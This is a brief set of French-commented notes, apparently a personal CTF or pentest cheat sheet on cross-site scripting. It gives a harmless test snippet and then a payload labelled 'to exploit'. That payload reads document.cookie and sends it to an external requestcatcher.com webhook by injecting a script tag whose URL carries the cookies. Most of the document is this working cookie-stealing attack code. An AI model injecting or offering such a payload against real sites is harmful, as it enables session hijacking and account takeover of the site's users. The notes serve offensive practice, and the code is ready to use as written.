# Web

## XSS

```js
// Pour tester
<p id="p1">Testarossa</p>
<script>
document.getElementById("p1").innerHTML = "Life found a way !";
</script>
```

Webhook : https://busterbaxter.requestcatcher.com/
```js
// Pour exploiter
<script>
var url="https://busterbaxter.requestcatcher.com/";
var extra=document.cookie;

var script = document.createElement("script");
script.src = url + extra;
document.body.appendChild(script);
</script>:-)
```
